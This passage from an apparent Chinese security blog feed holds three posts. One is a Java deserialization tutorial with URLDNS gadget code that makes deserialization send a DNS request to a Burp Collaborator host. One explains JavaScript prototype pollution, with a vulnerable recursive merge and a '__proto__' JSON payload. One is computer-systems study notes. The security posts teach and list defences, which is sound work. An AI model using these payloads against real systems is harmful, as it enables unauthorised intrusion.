HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>这里选择HashMap作为入口类的原因是因为HashMap已经继承了<code>Serializable</code>，并且HashMap的类型较为宽泛。</p><p>首先查看<code>HashMap</code>的<code>readObject</code>方法，发现在最后读取了<code>key</code>和<code>value</code>，对<code>key</code>调用了<code>hash</code>函数，重新计算<code>key</code>的哈希值。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/6.png" alt="6"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/7.png" alt="7"></p><p>跟进hash函数，发现当<code>Object</code>类型的<code>key</code>不为空时，就会调用<code>key</code>的<code>hashCode</code>函数。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/8.png" alt="8"></p><p>Java中与HTTP相关的是URL类，通过查看URL类发现继承了<code>java.io.Serializable</code>接口，故而考虑是否可以反序列化。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/3.png" alt="3"></p><p>正常发起请求是通过<code>URLConnection</code>类中的<code>openConnection</code>方法实现，通过分析发现在<code>openConnection</code>之后的执行过程中并不存在反序列化，因此可以从一个最常见的函数<code>hashCode</code>函数开始。在<code>hashCode</code>函数中首先会判断<code>hashCode</code>是否等于-1，如果不等于就返回。如果等于-1就会调用<code>handler</code>的<code>hashCode</code>函数。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/4.png" alt="4"></p><p>跟进<code>handler</code>的<code>hashCode</code>函数，发现该函数做了一个域名解析的工作，这样可以得到一个DNS请求，从而帮助我们验证是否存在漏洞。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/5.png" alt="5"></p><p>因此总结下来的调用链就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">  HashMap.hash()</span><br><span class="line">  URL.hashCode()</span><br><span class="line">  URLStreamHandler-&gt;hashCode()</span><br><span class="line">  URLStreamHandler-&gt;getHostAddress()</span><br></pre></td></tr></table></figure><h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><p>首先用Burp生成一个接收DNS请求的URL</p><p><img src="/2021/09/25/Java反序列化漏洞基础/9.png" alt="9"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/10.png" alt="10"></p><p>构造序列化hashmap代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://ymohh3hbo4k4eoujmuxg1eij6ac00p.burpcollaborator.net"</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下在序列化的过程中应该什么也不会发生，但是我们发现实际上在序列化的过程中已经接收到了请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/11.png" alt="11"></p><p>分析发现当调用<code>hashmap.put</code>的时候，为了保证键的唯一，会调用hash方法，从而执行了<code>hashCode</code>方法。因此在序列化之前，就已经发起了DNS请求。因为这里的<code>key</code>是URL，而在URL的<code>hashCode</code>函数中，<code>hashCode</code>变量的初始值是-1，并且是私有属性。因此会执行<code>handler.hashCode</code>操作，进而发起DNS请求。DNS请求结束之后，<code>hashCode</code>变量的值已经是<code>url</code>经过哈希之后的值，所以这个值肯定不是-1，所以对于序列化之后的反序列化操作并没有用。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/12.png" alt="12"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/14.png" alt="13"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/13.png" alt="14"></p><p>总之，这个序列化操作是在<code>hashCode</code>不等于-1的状态下进行的，因此在后面反序列化的时候也不会执行相关命令。</p><p>这里我们在执行反序列化操作之后发现并没有收到请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/11.png" alt="11"></p><p>为了达到攻击效果，我们要做的就是在<code>hashmap.put</code>之前将<code>hashcode</code>的值改为不是-1，这样就会直接返回<code>hashcode</code>从而不会发起DNS请求，在序列化之前将<code>hashcode</code>的值改为-1，这样就会执行后续的<code>handler.hashCode</code>操作。从而在反序列化的时候重新计算<code>hashcode</code>的值，进而发起DNS请求，因此我们可以使用反射的方法来改变已有对象的属性。</p><p>序列化代码如下，执行之后发现并没有收到DNS请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//这里不发起请求，将url对象的hashcode改为不是-1</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://6kriz54pcbef87xbzcjk2w70xr3ir7.burpcollaborator.net"</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field hashcodefield = c.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//序列化之前将hashcode改为-1</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行反序列化代码之后，收到DNS请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/15.png" alt="15"></p><p>debug调试反序列化的代码发现<code>hashcode</code>的值已经修改成功，这样就验证了URLDNS反序列化漏洞。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/16.png" alt="16"></p><h4 id="反序列化漏洞如何防范"><a href="#反序列化漏洞如何防范" class="headerlink" title="反序列化漏洞如何防范"></a>反序列化漏洞如何防范</h4><ul><li><p>类白名单校验</p><p>在<code>ObjectInputStream</code>类中的<code>resolveClass</code>方法中只是进行了<code>class</code>是否能被加载，因此可以自定义<code>ObjectInputStream</code>，之后重载<code>resolveClass</code>方法，对<code>className</code>进行白名单校验。</p></li><li><p>禁止JVM执行外部命令<code>Runtime.exec</code></p><p>通过扩展<code>SecurityManager</code>实现</p></li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">https://www.runoob.com/java/java-serialization.html</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1298366845681698" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1252599548343744/1298366845681698</a></li><li><a href="https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/" target="_blank" rel="noopener">https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/</a></li><li><a href="https://m0nit0r.top/2020/06/04/java-deserialize-learn1/" target="_blank" rel="noopener">https://m0nit0r.top/2020/06/04/java-deserialize-learn1/</a></li><li><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;spm_id_from=pageDriver" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;spm_id_from=pageDriver</a></li><li><a href="https://www.freebuf.com/articles/web/275842.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/275842.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化简介&quot;&gt;&lt;a href=&quot;#序列化与反序列化简介&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化简介&quot;&gt;&lt;/a&gt;序列化与反序列化简介&lt;/h4&gt;&lt;p&gt;序列化是将对象的状态信息转化为可以存储或者传输的形式的过程，一般将一个对象存
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染攻击</title>
    <link href="elssm.github.io/2021/09/23/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/"/>
    <id>elssm.github.io/2021/09/23/JavaScript原型链污染攻击/</id>
    <published>2021-09-23T10:29:52.000Z</published>
    <updated>2021-09-24T01:35:54.822Z</updated>
    
    <content type="html"><![CDATA[<h4 id="JavaScript原型"><a href="#JavaScript原型" class="headerlink" title="JavaScript原型"></a>JavaScript原型</h4><p>在JavaScript中，原型也是一个对象，通过原型可以实现对象的属性继承，JavaScript的对象中都包含了一个<code>[[Prototype]]</code>内部属性，这个属性所对应的就是该对象的原型。<code>[[Prototype]]</code>作为对象的内部属性，是不能被直接访问的，所以为了方便的查看一个对象的原型，Firefox和Chrome提供了<code>__proto__</code>这个非标准的访问器。每个对象拥有一个原型对象，对象以其原型为模版，从原型继承方法和属性，原型对象也可能拥有原型，并从中继承方法和属性，层层递推，这种关系被称为原型链。</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/1.png" alt="1"></p><p>其中，<code>foo</code>是一个<code>Foo</code>类的实例，有两个属性：bar、[[Prototype]]，其中bar是我们构造函数中定义的，而[[Prototype]]就是<code>Foo.prototype</code>，在JavaScript中，每个函数都有一个prototype属性，当一个函数被用作构造函数来创建实例时，该函数的prototype属性将被作为原型赋值给所有对象实例，也就是说，所有实例的原型引用的是函数的prototype属性。遵循ECMAScript标准，<code>Foo.[[Prototype]]</code> 符号是用于指向 <code>Foo</code> 的原型。从 ECMAScript 6 开始，<code>[[Prototype]]</code> 可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf" target="_blank" rel="noopener"><code>Object.getPrototypeOf()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf" target="_blank" rel="noopener"><code>Object.setPrototypeOf()</code></a> 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <code>__proto__</code>。</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/2.webp" alt="2"></p><p>如上图所示是一个原型链图，其中Parent是构造函数，p1是通过Parent实例化出来的一个对象。当谈到继承时，JavaScript只有一种数据结构：对象。每个实例对象都有一个私有属性(<code>__proto__</code>)指向它的构造函数的原型对象(prototype)。该原型对象也有一个自己的原型对象(<code>__proto__</code>)，层层向上知道一个对象的原型对象为<code>null</code>，根据定义<code>null</code>没有原型，并作为这个原型链中的最后一个环节。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Parent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Parent();</span><br></pre></td></tr></table></figure><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h4><p><code>prototype</code>是函数独有的属性，从 上图可以看到它从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。有了<code>prototype</code>我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。</p><h4 id="proto属性"><a href="#proto属性" class="headerlink" title="proto属性"></a>proto属性</h4><p><code>__proto__</code>属性时对象(包括函数)独有的，从图中可以看到<code>__proto__</code>属性是从一个对象指向另一个对象，即从一个对象指向该对象的原型对象，<code>Parent.prototype</code>上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型对象上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过<code>__proto__</code>属性。每个对象都有<code>__proto__</code>属性，该属性指向的就是该对象的原型对象。<code>__proto__</code>通常称为隐式原型，<code>prototype</code>通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。</p><h4 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h4><p><code>constructor</code>是对象才有的属性，它是从一个对象指向一个函数的，指向的函数就是该对象的构造函数，每个对象都有构造函数。</p><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><p>对于JavaScript而言，很少有真正的私有属性，类的所有属性都允许被公开的访问和修改，包括proto、构造函数和原型，攻击者可以通过注入其他值来覆盖或污染这些proto、构造函数和原型属性，然后，所有继承了被污染原型的对象都会受到影响，原型链污染通常会导致拒绝服务、篡改程序执行流程、RCE等。</p><p>如下定义一个递归合并函数merge()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(source)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) <span class="built_in">Object</span>.assign(source[key], merge(target[key], source[key]))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Object</span>.assign(target || &#123;&#125;, source)</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age,gender</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line"><span class="keyword">this</span>.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newperson=<span class="keyword">new</span> Person(<span class="string">"test1"</span>,<span class="number">22</span>,<span class="string">"male"</span>);</span><br><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">'&#123;"title":"Security Engineer","country":"China","male":"true"&#125;'</span>);</span><br><span class="line">merge(newperson,job);</span><br><span class="line"><span class="built_in">console</span>.log(newperson);</span><br></pre></td></tr></table></figure><p>对于上述代码，如果job对象是由用户输入的，并且输入是任意的，那么我们可以输入一个含有proto属性的对象，那当合并的时候就可以把Person的原型给修改了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">'&#123;"title":"Security Engineer","country":"China","__proto__":&#123;"x":1&#125;&#125;'</span>);</span><br></pre></td></tr></table></figure><p>修改后的结果如下图所示</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/3.png" alt="3"></p><p>这里需要注意的是，只有不安全的递归合并函数才会导致原型链污染，非递归的算法并不会导致原型链污染，例如JavaScript自带的<code>Object.assign</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,gender)&#123;</span><br><span class="line">this.name=name;</span><br><span class="line">this.age=age;</span><br><span class="line">this.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line">let person1=new Person(&quot;test1&quot;,22,&quot;male&quot;);</span><br><span class="line">let job=JSON.parse(&apos;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&apos;);</span><br><span class="line">Object.assign(person1,job);</span><br><span class="line">console.log(Person.prototype);</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/JavaScript原型链污染攻击/4.png" alt="4"></p><h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><ul><li>字符串可以被解析为方法或对象，例如<code>JSON.parse</code>进行解析，<code>shvl</code>库使用点对属性操作。</li><li>对象的键和值都可控，<code>target[key] = value</code></li></ul><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><ul><li>禁止操作<code>constructor</code></li><li>禁止操作<code>prototype</code></li><li>禁止操作<code>__proto__</code></li></ul><h4 id="JS原型小结"><a href="#JS原型小结" class="headerlink" title="JS原型小结"></a>JS原型小结</h4><ul><li><code>__proto__</code>、<code>constructor</code>属性是对象所独有的</li><li><code>prototype</code>属性是函数独有的</li><li>在js中函数也是对象的一种，那么函数同样也有属性<code>__proto__</code>、<code>constructor</code></li><li>所有的引用类型都有一个<code>__proto__</code>属性（也叫隐式属性，是一个普通的对象）</li><li>所有的函数都有一个<code>prototype</code>属性（也叫显式属性，是一个普通的对象）</li><li>当试图得到一个对象属性时，如果这个对象本身不存在这个属性，会从它的构造函数的<code>prototype</code>属性中去寻找</li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://www.freebuf.com/articles/web/275619.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/275619.html</a></li><li><a href="https://www.cnblogs.com/wilber2013/p/4924309.html" target="_blank" rel="noopener">https://www.cnblogs.com/wilber2013/p/4924309.html</a></li><li><a href="https://segmentfault.com/a/1190000021232132" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021232132</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;JavaScript原型&quot;&gt;&lt;a href=&quot;#JavaScript原型&quot; class=&quot;headerlink&quot; title=&quot;JavaScript原型&quot;&gt;&lt;/a&gt;JavaScript原型&lt;/h4&gt;&lt;p&gt;在JavaScript中，原型也是一个对象，通过原型可以实现
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统（一）</title>
    <link href="elssm.github.io/2021/09/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>elssm.github.io/2021/09/16/深入理解计算机系统（一）/</id>
    <published>2021-09-16T11:07:17.000Z</published>
    <updated>2021-09-18T13:54:12.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="系统漫游"><a href="#系统漫游" class="headerlink" title="系统漫游"></a>系统漫游</h3><h4 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h4><p>从<code>hello world</code>说起。<code>hello world</code>程序的生命周期是从一个源程序开始的，程序员通过编辑器创建并保存的文本文件，文件名为<code>hello.c</code>。源程序实际上是一个由0和1组成的位序列。8个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello,world\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hello.c</code>程序是以字节序列的方式存储在文件中的，每个字节都有一个整数值，对应于某些字符。例如第一个字节的整数值是35，对应的字符是“#”。需要注意的是，每个文本行都是以一个看不见的换行符“\n”来结束的，像<code>hello.c</code>这样只由ASCII字符构成的文件称为文本文件，所有其他文件都称为二进制文件。</p><p><code>hello.c</code>的表示方法说明了一个基本思想，系统中所有的信息包括磁盘文件、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。在不同上下文中，一个发相同的字节序列可能表示一个整数、浮点数、字符串或者机器指令。</p><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p><code>hello</code>程序的生命周期是从一个高级C语言程序开始的，因为这种形式能够被人读懂，然而为了在系统上运行<code>hello.c</code>程序，每条C语言都必须被其他程序转化为一系列的低级机器语言指令。然后这些指令按照一种称为可执行目标程序的格式打好包。并以二进制磁盘文件的形式存放起来，目标程序也被称为可执行目标文件。</p><p>在Unix系统上，从源文件到目标文件的转化是由编译器驱动程序完成的。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/1.png" alt="1"></p><p>在这里，GCC编译器驱动程序读取源程序文件<code>hello.c</code>，并把它翻译成一个可执行目标文件<code>hello</code>。这个翻译过程可分为以上四个阶段完成。执行这四个阶段的程序一起构成了编译系统。</p><ul><li>预处理阶段。预处理器根据以字符<code>#</code>开头的命令，修改原始的C程序。比如<code>hello.c</code>中第一行的命令告诉预处理器读取系统头文件<code>stdio.h</code>的内容，并把它直接插入程序文本中。结果就得到了另一个C程序，通常是以<code>.i</code>作为文件扩展名。</li><li>编译阶段。编译器将文本文件<code>hello.i</code>翻译成文本文件<code>hello.s</code>，它包含一个汇编语言程序，该程序包含函数main的定义。</li><li>汇编阶段。汇编器将<code>hello.s</code>翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序的格式，并将结果保存在目标文件<code>hello.o</code>中，<code>hello.o</code>文件是一个二进制文件，它包含的17个字节是函数main的指令编码。</li><li>链接阶段。hello程序调用了printf函数，它是每个C编译器豆提供的标准C库中的一个函数。printf函数存在于一个名为<code>printf.o</code>的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的<code>hello.o</code>程序中，链接器就负责处理这种合并，结果就得到hello文件，它是一个可执行目标文件，可以被加载到内存中，由系统执行。</li></ul><h4 id="系统硬件组成"><a href="#系统硬件组成" class="headerlink" title="系统硬件组成"></a>系统硬件组成</h4><ul><li><strong>总线</strong>：贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定长的字节块，也就是字。</li><li><strong>I/O设备</strong>：I/O设备是系统与外部世界的联系通道。，我们的示例系统包括四个I/O设备：作为用户输入的键盘和鼠标，作为用户输出的显示器，以及用于长期存储数据和程序的磁盘启动器，最开始，可执行程序就存放在磁盘上。<strong>每个I/O设备都通过一个控制器或适配器与I/O总线相连。</strong>控制器和适配器之间的区别主要在于它们的封装方式。</li><li><strong>主存</strong>：主存是一个临时存储设备。在处理器执行程序时，用来存放程序和程序处理的数据，从物理上来说，主寸是由一组动态随机存取存储器（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址，这些地址是从零开始的。一般来讲，组成程序的每条机器指令都由不同数量的字节构成。</li><li><strong>处理器</strong>：处理器是解释存储在主存中指令的引擎，处理器的核心是一个大小为一个字的存储设备，称为程序计数器(PC)。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）</li></ul><p>一个典型系统的硬件组成如下图所示</p><p><img src="/2021/09/16/深入理解计算机系统（一）/2.png" alt="2"></p><h4 id="程序的运行"><a href="#程序的运行" class="headerlink" 